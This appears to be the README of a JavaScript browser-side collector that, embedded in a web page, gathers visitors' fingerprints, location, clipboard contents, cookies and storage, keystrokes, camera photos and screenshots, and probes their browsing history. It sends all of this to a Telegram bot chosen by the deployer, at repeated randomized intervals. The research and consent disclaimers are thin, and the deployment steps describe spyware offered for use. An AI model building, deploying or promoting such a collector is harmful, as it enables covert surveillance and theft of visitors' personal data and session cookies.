# Device & Environment Info Collector

## Overview

This project is a comprehensive JavaScript-based client-side data collector. It gathers a wide spectrum of device, browser, and network information from the user's environment and sends it securely to a specified Telegram chat via a bot. The project is designed for research, diagnostics, or administrative monitoring purposes.

---

## Features

- **Permission Detection**: Checks browser permissions (camera, geolocation, microphone, notifications).
- **IP and Location**: Fetches public IP and geo-details using `ipify` and `ipapi`.
- **Device Fingerprinting**: Collects canvas, audio, WebGL, fonts, and related browser fingerprint data.
- **Device Information**: Gathers details such as user agent, platform, language, screen size, memory, CPU, and more.
- **Network & Battery**: Collects network type, battery status, and connection metrics.
- **Geolocation**: Attempts GPS-based location, falls back to IP-based if denied.
- **Sensors**: Reads motion, orientation, and ambient light (if available).
- **Clipboard & Storage**: Captures clipboard, cookies, local/session storage, and IndexedDB availability.
- **WebRTC Local IPs**: Attempts to enumerate local network IP addresses.
- **Keystroke Capture**: Logs up to 20 keystrokes for diagnostic use.
- **Media Access**: Optionally captures camera photo, screen, and audio metadata.
- **Bluetooth & Extensions**: Probes for Bluetooth devices and common browser extensions.
- **Visited Sites Cache Probe**: Uses image load timing to infer visits to popular social sites.
- **Error Handling & Logging**: Robust handling and optional debug logging.
- **Data Transmission**: Sends summary and media (photo/screenshot) to Telegram with retry logic and rate limiting.

---

## Usage

### 1. Clone or Download

```bash
git clone https://github.com/yourusername/device-info-collector.git
cd device-info-collector
```

### 2. Configuration

- Edit `java.js` and set your own Telegram Bot Token and Chat ID:
  ```js
  const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
  const CHAT_ID = 'YOUR_CHAT_ID';
  ```

- Optionally, enable debug logging:
  ```js
  const DEBUG = true;
  ```

### 3. Deploy

- **HTTPS is required** to access privileged APIs (camera, microphone, clipboard, etc.).
- Deploy on platforms like [Vercel](https://vercel.com/), [Netlify](https://www.netlify.com/), or any HTTPS-capable host.
- Open `index.html` in a browser with the script included, or embed the JS in your own page.

### 4. Receive Data

- Data, screenshots, and (optionally) camera photos are sent to your specified Telegram chat.
- Each run collects and transmits data at randomized intervals (base: 2 minutes).

---

## File Structure

```
.
├── java.js       # Main client script
├── README.md     # Project documentation
└── index.html    # (Optional) Example HTML to load script
```

---

## Security & Privacy Disclaimer

**This tool collects sensitive information and can access or transmit personal data. Do NOT use without informed user consent and compliance with local laws and regulations.**

**Intended for authorized testing, diagnostics, or research only. Never use for unauthorized tracking or data collection.**

---

## Customization

- **Add/Remove Data Points**: Edit the relevant async function blocks in `captureAndSend()` as needed.
- **Change Transmission Logic**: Modify `sendMessageToTelegramWithRetry()` or `sendPhotoWithRetry()` to integrate with other endpoints.
- **Data Formatting**: Tweak `formatCollectedData()` for different summarization or reporting styles.

---

## Example HTML Usage

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Device Info Collector</title>
</head>
<body>
  <script src="java.js"></script>
</body>
</html>
```

---

## Dependencies

- **No external libraries required.**
- Uses modern browser APIs (`fetch`, `navigator`, `window`, etc.) and Telegram Bot API.

---

## Troubleshooting

- Make sure your deployment uses HTTPS.
- Ensure your Telegram bot is active and the chat ID is correct.
- Some APIs require user interaction or permissions (camera, microphone, clipboard, sensors).
- Features may not work identically across all browsers/devices.
- Check the browser console and set `DEBUG = true` for verbose logs.

---

## License

This project is provided for **educational and authorized diagnostic use only**. Check the LICENSE file or contact the author for more details.

---

## Author

- [Ali-hey-0]
- [email:aliheydari1381doc@gmail.com]